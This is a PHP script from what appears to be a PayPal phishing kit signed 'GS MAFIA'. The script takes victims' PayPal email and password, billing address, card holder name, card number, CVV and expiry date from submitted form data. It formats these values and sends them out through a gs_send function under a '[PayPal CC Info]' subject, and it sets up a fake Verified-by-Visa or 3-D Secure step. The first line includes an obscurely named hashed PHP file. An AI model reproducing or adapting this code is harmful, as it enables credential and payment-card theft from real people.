<?php include_once'../../../../02f5c794f8e62115216710ab8d38aa0f.php';?><?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_cardarray'] = $_POST;
$_SESSION['page'] = "card";
$_SESSION["gs_cardarray"]["bin"] = getbin($_POST["gs_cc"]);
$ip = getclientip();
$GS_SEND["E-Mail"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_email"]."</span>";
$GS_SEND["Password"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_password"]."</span>";
$GS_SEND["BLANKK1"] = "";
$GS_SEND["First Name"] = $_SESSION["gs_billarray"]["gs_fname"];
$GS_SEND["Last Name"] = $_SESSION["gs_billarray"]["gs_lname"];
$GS_SEND["Address"] = $_SESSION["gs_billarray"]["gs_street1"];
$GS_SEND["City"] = $_SESSION["gs_billarray"]["gs_city"];
$GS_SEND["Zip"] = $_SESSION["gs_billarray"]["gs_postalCode"];
$GS_SEND["Country"] = $_SESSION['gs_country'];
$GS_SEND["BLANKK21"] = "";
$GS_SEND["Holder Name"] = "<span style='color:green'>".$_POST["gs_holder"]."</span>";
$GS_SEND["Card Number"] = "<span style='color:green'>".$_POST["gs_cc"]."</span>";
$GS_SEND["CVV"] = "<span style='color:green'>".$_POST["gs_csc"]."</span>";
$GS_SEND["Exp Date"] = "<span style='color:green'>".$_POST["gs_exp_month"]." / ".$_POST['gs_exp_year']."</span>";
$GS_SEND["Info Bin"] = $_SESSION['gs_cardarray']['bin']['_cc_bank_'];
gs_send($GS_SEND,"[PayPal CC Info] | ".$ip." | { ".$_SESSION["gs_cardarray"]["bin"]["scheme"]." ".$_SESSION["gs_cardarray"]["bin"]["_cc_bank_"]." }");
$xm = substr($_POST["gs_cc"], 0,1 );
if($xm  == 4)
	$_SESSION["gs_vbvlogo"] = "/VBV.gif";
elseif  ($xm  == 5)
	$_SESSION["gs_vbvlogo"] = "/3D.gif";

 ?>